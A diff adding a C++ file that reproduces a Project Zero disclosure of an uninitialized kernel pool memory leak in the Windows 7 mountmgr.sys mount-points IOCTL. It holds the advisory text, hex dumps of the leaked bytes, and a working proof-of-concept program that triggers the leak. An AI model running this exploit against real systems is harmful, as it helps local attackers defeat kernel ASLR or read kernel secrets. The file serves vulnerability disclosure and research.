@@ -1,0 +1,177 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1150&desc=2
+
+We have discovered that the handler of the IOCTL_MOUNTMGR_QUERY_POINTS IOCTL in mountmgr.sys discloses portions of uninitialized pool memory to user-mode clients, due to output structure alignment holes.
+
+On our test Windows 7 32-bit workstation, an example layout of the output buffer is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ff ff ................
+00000020: 00 00 00 00 00 00 ff ff 00 00 00 00 00 00 ff ff ................
+00000030: 00 00 00 00 00 00 ff ff 00 00 00 00 00 00 ff ff ................
+00000040: 00 00 00 00 00 00 ff ff 00 00 00 00 00 00 ff ff ................
+00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000000a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000000b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000000c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000000d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000000e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000000f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000110: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000120: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000130: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000140: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000150: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000160: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+--- cut ---
+
+Where 00 denote bytes which are properly initialized, while ff indicate uninitialized values copied back to user-mode. The output data is returned in a MOUNTMGR_MOUNT_POINTS structure [1], which in turn contains a list of MOUNTMGR_MOUNT_POINT structures [2]. If we map the above shadow bytes to the structure definitions, it turns out that the repeating pairs of uninitialized bytes correspond to alignment holes after the SymbolicLinkNameLength, UniqueIdLength and DeviceNameLength fields (all of type USHORT, followed by LONG fields, which must be 4-aligned). The concrete number of leaked bytes depends on the number of entries returned by the IOCTL.
+
+The issue can be reproduced by running the attached proof-of-concept program on a system with the Special Pools mechanism enabled for ntoskrnl.exe. Then, it is clearly visible that bytes at the aforementioned offsets are equal to the markers inserted by Special Pools, and would otherwise contain leftover data that was previously stored in that memory region:
+
+--- cut ---
+00000000: 56 03 00 00 05 00 00 00 ba 00 00 00 60 00 00 00 V...........`...
+00000010: 80 00 00 00 0c 00 00 00 8c 00 00 00 2e 00[67 67]..............gg
+00000020: 54 01 00 00 1c 00[67 67]1a 01 00 00 0c 00[67 67]T.....gg......gg
+00000030: 26 01 00 00 2e 00[67 67]70 01 00 00 60 00[67 67]&.....ggp...`.gg
+00000040: 1a 01 00 00 0c 00[67 67]26 01 00 00 2e 00[67 67]......gg&.....gg
+00000050: da 02 00 00 60 00[67 67]d0 01 00 00 ee 00[67 67]....`.gg......gg
+00000060: be 02 00 00 1c 00[67 67]3a 03 00 00 1c 00[67 67]......gg:.....gg
+00000070: d0 01 00 00 ee 00[67 67]be 02 00 00 1c 00[67 67]......gg......gg
+00000080: ee a2 5d 9f 00 00 10 00 00 00 00 00 5c 00 44 00 ..].........\.D.
+00000090: 65 00 76 00 69 00 63 00 65 00 5c 00 48 00 61 00 e.v.i.c.e.\.H.a.
+000000a0: 72 00 64 00 64 00 69 00 73 00 6b 00 56 00 6f 00 r.d.d.i.s.k.V.o.
+000000b0: 6c 00 75 00 6d 00 65 00 31 00 5c 00 3f 00 3f 00 l.u.m.e.1.\.?.?.
+000000c0: 5c 00 56 00 6f 00 6c 00 75 00 6d 00 65 00 7b 00 \.V.o.l.u.m.e.{.
+000000d0: 62 00 63 00 30 00 35 00 62 00 34 00 39 00 34 00 b.c.0.5.b.4.9.4.
+000000e0: 2d 00 64 00 38 00 34 00 37 00 2d 00 31 00 31 00 -.d.8.4.7.-.1.1.
+000000f0: 65 00 34 00 2d 00 61 00 33 00 30 00 64 00 2d 00 e.4.-.a.3.0.d.-.
+00000100: 38 00 30 00 36 00 65 00 36 00 66 00 36 00 65 00 8.0.6.e.6.f.6.e.
+00000110: 36 00 39 00 36 00 33 00 7d 00 ee a2 5d 9f 00 00 6.9.6.3.}...]...
+00000120: 50 06 00 00 00 00 5c 00 44 00 65 00 76 00 69 00 P.....\.D.e.v.i.
+00000130: 63 00 65 00 5c 00 48 00 61 00 72 00 64 00 64 00 c.e.\.H.a.r.d.d.
+00000140: 69 00 73 00 6b 00 56 00 6f 00 6c 00 75 00 6d 00 i.s.k.V.o.l.u.m.
+00000150: 65 00 32 00 5c 00 44 00 6f 00 73 00 44 00 65 00 e.2.\.D.o.s.D.e.
+00000160: 76 00 69 00 63 00 65 00 73 00 5c 00 43 00 3a 00 v.i.c.e.s.\.C.:.
+00000170: 5c 00 3f 00 3f 00 5c 00 56 00 6f 00 6c 00 75 00 \.?.?.\.V.o.l.u.
+00000180: 6d 00 65 00 7b 00 62 00 63 00 30 00 35 00 62 00 m.e.{.b.c.0.5.b.
+00000190: 34 00 39 00 35 00 2d 00 64 00 38 00 34 00 37 00 4.9.5.-.d.8.4.7.
+000001a0: 2d 00 31 00 31 00 65 00 34 00 2d 00 61 00 33 00 -.1.1.e.4.-.a.3.
+000001b0: 30 00 64 00 2d 00 38 00 30 00 36 00 65 00 36 00 0.d.-.8.0.6.e.6.
+000001c0: 66 00 36 00 65 00 36 00 39 00 36 00 33 00 7d 00 f.6.e.6.9.6.3.}.
+000001d0: 5c 00 3f 00 3f 00 5c 00 49 00 44 00 45 00 23 00 \.?.?.\.I.D.E.#.
+000001e0: 43 00 64 00 52 00 6f 00 6d 00 56 00 42 00 4f 00 C.d.R.o.m.V.B.O.
+000001f0: 58 00 5f 00 43 00 44 00 2d 00 52 00 4f 00 4d 00 X._.C.D.-.R.O.M.
+00000200: 5f 00 5f 00 5f 00 5f 00 5f 00 5f 00 5f 00 5f 00 _._._._._._._._.
+00000210: 5f 00 5f 00 5f 00 5f 00 5f 00 5f 00 5f 00 5f 00 _._._._._._._._.
+00000220: 5f 00 5f 00 5f 00 5f 00 5f 00 5f 00 5f 00 5f 00 _._._._._._._._.
+00000230: 5f 00 5f 00 5f 00 5f 00 5f 00 31 00 2e 00 30 00 _._._._._.1...0.
+00000240: 5f 00 5f 00 5f 00 5f 00 5f 00 23 00 35 00 26 00 _._._._._.#.5.&.
+00000250: 31 00 30 00 36 00 61 00 66 00 31 00 37 00 31 00 1.0.6.a.f.1.7.1.
+00000260: 26 00 30 00 26 00 31 00 2e 00 30 00 2e 00 30 00 &.0.&.1...0...0.
+00000270: 23 00 7b 00 35 00 33 00 66 00 35 00 36 00 33 00 #.{.5.3.f.5.6.3.
+00000280: 30 00 64 00 2d 00 62 00 36 00 62 00 66 00 2d 00 0.d.-.b.6.b.f.-.
+00000290: 31 00 31 00 64 00 30 00 2d 00 39 00 34 00 66 00 1.1.d.0.-.9.4.f.
+000002a0: 32 00 2d 00 30 00 30 00 61 00 30 00 63 00 39 00 2.-.0.0.a.0.c.9.
+000002b0: 31 00 65 00 66 00 62 00 38 00 62 00 7d 00 5c 00 1.e.f.b.8.b.}.\.
+000002c0: 44 00 65 00 76 00 69 00 63 00 65 00 5c 00 43 00 D.e.v.i.c.e.\.C.
+000002d0: 64 00 52 00 6f 00 6d 00 30 00 5c 00 3f 00 3f 00 d.R.o.m.0.\.?.?.
+000002e0: 5c 00 56 00 6f 00 6c 00 75 00 6d 00 65 00 7b 00 \.V.o.l.u.m.e.{.
+000002f0: 62 00 63 00 30 00 35 00 62 00 34 00 39 00 38 00 b.c.0.5.b.4.9.8.
+00000300: 2d 00 64 00 38 00 34 00 37 00 2d 00 31 00 31 00 -.d.8.4.7.-.1.1.
+00000310: 65 00 34 00 2d 00 61 00 33 00 30 00 64 00 2d 00 e.4.-.a.3.0.d.-.
+00000320: 38 00 30 00 36 00 65 00 36 00 66 00 36 00 65 00 8.0.6.e.6.f.6.e.
+00000330: 36 00 39 00 36 00 33 00 7d 00 5c 00 44 00 6f 00 6.9.6.3.}.\.D.o.
+00000340: 73 00 44 00 65 00 76 00 69 00 63 00 65 00 73 00 s.D.e.v.i.c.e.s.
+00000350: 5c 00 44 00 3a 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? \.D.:...........
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winioctl.h>
+#include <cstdio>
+
+typedef struct _MOUNTMGR_MOUNT_POINT {
+  ULONG  SymbolicLinkNameOffset;
+  USHORT SymbolicLinkNameLength;
+  ULONG  UniqueIdOffset;
+  USHORT UniqueIdLength;
+  ULONG  DeviceNameOffset;
+  USHORT DeviceNameLength;
+} MOUNTMGR_MOUNT_POINT, *PMOUNTMGR_MOUNT_POINT;
+
+typedef struct _MOUNTMGR_MOUNT_POINTS {
+  ULONG                Size;
+  ULONG                NumberOfMountPoints;
+  MOUNTMGR_MOUNT_POINT MountPoints[1];
+} MOUNTMGR_MOUNT_POINTS, *PMOUNTMGR_MOUNT_POINTS;
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  // Open mount point manager.
+  HANDLE hMntPointMgr = CreateFile(L"\\\\.\\MountPointManager",
+                                   0,
+                                   FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                   NULL,
+                                   OPEN_EXISTING,
+                                   FILE_ATTRIBUTE_NORMAL,
+                                   NULL);
+  if (hMntPointMgr == INVALID_HANDLE_VALUE) {
+    printf("CreateFile failed, %d\n", GetLastError());
+    return 1;
+  }
+
+  // Request data, assuming it fits into the 4096-byte buffer.
+  MOUNTMGR_MOUNT_POINT mnt_point;
+  RtlZeroMemory(&mnt_point, sizeof(mnt_point));
+
+  BYTE OutputBuffer[4096];
+  DWORD BytesReturned;
+  if (!DeviceIoControl(hMntPointMgr, 0x6D0008, &mnt_point, sizeof(mnt_point), OutputBuffer, sizeof(OutputBuffer), &BytesReturned, NULL)) {
+    printf("DeviceIoControl failed, %d\n", GetLastError());
+    CloseHandle(hMntPointMgr);
+    return 1;
+  }
+
+  PrintHex(OutputBuffer, BytesReturned);
+
+  CloseHandle(hMntPointMgr);
+
+  return 0;
+}
